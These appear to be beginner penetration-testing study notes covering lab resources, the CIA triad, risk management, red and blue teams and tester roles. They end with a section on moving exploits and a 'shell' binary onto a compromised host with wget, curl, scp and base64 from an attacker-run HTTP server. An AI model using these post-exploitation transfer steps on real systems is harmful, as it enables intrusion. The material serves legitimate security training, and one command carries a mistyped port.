# Starting Out
As a beginner in information security, it can be extremely daunting to know where to start. There are many great resources out there for beginners, including free and paid training, purposefully vulnerable machines and labs, tutorial websites, blogs, YouTube channels, etc.

# Resources
When starting, the sheer amount of content available on the web can be overwhelming. Furthermore, it isn't easy to know where to start and the quality of materials available.

## Vulnerable Machines/Applications
There are many resources available to practice common web and network vulnerabilities in a safe, controlled setting. The following are some examples of purposefully vulnerable web applications and vulnerable machines that we can set up in a lab environment for extra practice.

| Name             | Description                                                                                                                                                                           |
| -------------    |:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
| OWASP Juice Shop | Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire OWASP Top Ten along with many other real-world application security flaws. |
| Metasploitable 2 | Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.                                                            |
| Metasploitable 3 | Is a template for building a vulnerable Windows VM configured with a wide range of vulnerabilities.                                                                                   | 
| DVWA             | This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.                                             | 

It is worth learning how to set these up in your lab environment to gain extra practice setting up VMs and working with common configurations such as setting up a web server. Aside from these vulnerable machines/applications, we can also set up many machines and applications in a lab environment to practice configuration, enumeration/exploitation, and remediation.

## YouTube Channels
There are many YouTube channels out there that showcase penetration testing/hacking techniques. A few worth bookmarking are:

| Name         | Description                                                                                                                                                  |
| -------------|:------------------------------------------------------------------------------------------------------------------------------------------------------------:|
| IppSec       | Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques. |
| VbScrub      | Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation.                                                    |
| STÖK         | Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing.                                  | 
| LiveOverflow | Provides videos on a wide variety of technical infosec topics.                                                                                               | 

# Infosec Overview
Information Security (infosec) is a vast field. The field has grown and evolved greatly in the last few years. It offers many specializations, including but not limited to:

- Network and infrastructure security
- Applications security
- Security testing
- Systems auditing
- Business continuity planning
- Digital forensics
- Incident detection and response

In a nutshell, infosec is the practice of protecting data from unauthorized access, changes, unlawful use, disruption, etc. Infosec professionals also take actions to reduce the overall impact of any such incident.

Data can be electronic or physical and tangible (e.g., design blueprints) or intangible (knowledge). A common phrase that will come up many times in out infosec career is protecting the "confidentiality, integrity, and availability of data," or the **CIA triad**.

# Risk Management Process
Data protection must focus on efficient yet effective policy implementation without negatively affecting an organization's business operations and productivity. To achieve this, organization's business operations and productivity. To achieve this, organizations must follow a process called the **risk management process**. This process involves the following five steps:

| Step         | Explanation                                                                                                                                                                                      |
| -------------|:------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
| Identifying the Risk  | Identifying risks the business is exposed to, such as legal, environmental, market, regulatory, and other types of risks.                                                               |
| Analyze the Risk      | Analyzing the risks to determine their impact and probability. The risks should be mapped to the organization's various policies, procedures, and business processes.                   |
| Evaluate the Risk     | Evaluating, ranking, and prioritizing risks. Then, the organization must decide to accept (unavoidable), avoid (change plans), control (mitigate), or transfer risk (insure).           | 
| Dealing with the Risk | Eliminating or containing the risks as best as possible. This is handled by interfacing directly with the stakeholders for the system or process that the risk is associated with.      | 
| Monitoring Risk       | All risks must be constantly monitored. Risks should be constantly monitored for any situational changes that could change their impact score, i.e., from low to medium or high impact. | 

As mentioned previously, the core tenet of infosec is information assurance, or maintaining the CIA of data and making sure that it is not compromised in any way, shape, or form when an incident occurs. An incident could be a natural diaster, system malfunction, or security incident.

# Red Team vs. Blue Team
In infosec, we usually hear the terms **red team** and **blue team**. In the simplest terms, the **red team** plays the attackers' role, while the **blue team** plays the defenders' part.

Red teamers usually play an adversary role in breaking into the organization to identify any potential weaknesses real attacker may utilize to break the organization's defenses. The most common task on the red teaming side is penetration testing, social engineering, and other similar offensive techniques.

On the other hand, teh blue team makes up the majority of infosec jobs. It is responsible for strengthening the organization's defenses by analyzing the risks, coming up with policies, responding to threats and incidents, and effectively using security tools and other similar tasks.

# Role of Penetration Testers
A security assessor (network penetration tester, web application penetration tester, red teamer, etc.) helps an organization identify risks in its external and internal networks. These risks may include network or web application vulnerabilities, sensitive data exposure, misconfigurations, or issues that could lead to reputational harm. A good tester can work with a client to identify risks to their organization, provide information on how to reproduce these risks, and guidance on either mitigating or remediating the issues identified during testing.

Assessments can tame many forms, from a white-box penetration test against all in-scope systems and applications to identify as many vulnerabilities as possible, to a phishing assessment to assess the risk or employee's security awareness, to a targeted red team assessment built around a scenario to emulate a real-world threat actor.

We must understand the bigger picture of the risks an organization faces and its environment to evaluate and rate vulnerabilities discovered during testing accurately. A deep understanding of the risk management process is critical for anyone starting in information security.



# Transferring Files
During any penetration test exercise, it is likely that we will need to transfer files to a remote server, such as enumeration scripts or exploits, or transfer data back to our attack host.

While tools like Metasploit with a Meterpreter shell allow us to use the **Upload** command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

## Using wget
There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host.

First we go into the directory that contains the file we need to transfer and run a Python HTTP server in it.

```
kieferhax@htb[/htb]$ cd /tmp
kieferhax@htb[/htb]$ python3 -m http.server 8000   

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```
user@remotehost$ wget http://10.10.14.1:80000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[=======================>] 144.86K --.- KB/s in 0.02s

2021-02-08 18:09:19 (8.16 MD/s) - 'linenum.sh' saved [14337/14337]
```

Note that we used our IP *10.10.14.1* and the port our Python server runs on **8000**. If the remote server does not have **wget**, we can use **cURL** to download the file:

```
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

## Using SCP
Another method to transfer files would be using **scp**, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

```
kieferhax@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Note that we specified the local file name after **scp**, and the remote directory will be saved to after the **:**.

## Using Base64
In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine.

In this type of situation, we can use a simple trick to *base64* encode the file into **base64** format, and then we can paste the **base64** string on the remote server and decode it. For example, if we wanted to transfer a binary file called **shell**, we can **base64** encode it as follows:

```
kieferhax@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Now we can copy this **base64** string, go to the remote host, and use **base64 -d** to decode it, and pipe the output into a file:

```
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating File Transfers
To validate the format of a file, we can run the **file** command on it:

```
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

As we can see, when we run the **file** command on the **shell** file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash.  On our machine, we can run **md5sum** on it:

```
kieferhax@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Now we can go to the remote server and run the same command on the file we transferred:

```
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

As we can see, both files have the same md5 hash, meaning the file was transferred correctly and without any issues.